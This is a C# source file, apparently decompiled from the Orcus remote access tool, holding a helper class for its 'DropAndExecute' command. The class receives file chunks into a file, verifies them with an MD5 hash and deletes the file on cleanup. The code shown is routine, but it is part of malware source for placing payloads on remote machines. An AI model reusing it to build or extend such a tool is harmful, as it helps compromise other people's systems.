using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Threading;
using Orcus.Shared.Commands.DropAndExecute;
using Orcus.Shared.Utilities;

namespace Orcus.Commands.DropAndExecute;

public class TransferedFileInfo : IDisposable
{
	private readonly int _length;

	private readonly byte[] _hash;

	private FileStream _fileStream;

	public Guid Guid { get; }

	public string FileName { get; }

	public bool IsFinished { get; private set; }

	public TransferedFileInfo(FileTransferInfo fileTransferInfo, string targetDirectory)
	{
		Guid = fileTransferInfo.get_Guid();
		_length = fileTransferInfo.get_Length();
		_hash = fileTransferInfo.get_Hash();
		FileName = FileExtensions.MakeUnique(Path.Combine(targetDirectory, fileTransferInfo.get_Name()));
		_fileStream = new FileStream(FileName, FileMode.CreateNew, FileAccess.ReadWrite);
	}

	public bool? ReceiveData(byte[] data, int index, int length)
	{
		_fileStream.Write(data, index, length);
		if (_fileStream.Length == _length)
		{
			IsFinished = true;
			_fileStream.Position = 0L;
			try
			{
				using MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				return mD5CryptoServiceProvider.ComputeHash(_fileStream).SequenceEqual(_hash);
			}
			finally
			{
				_fileStream.Dispose();
				_fileStream = null;
			}
		}
		return null;
	}

	public void Dispose()
	{
		_fileStream?.Dispose();
		try
		{
			File.Delete(FileName);
			return;
		}
		catch (Exception)
		{
		}
		Thread.Sleep(1000);
		try
		{
			File.Delete(FileName);
		}
		catch (Exception)
		{
		}
	}
}
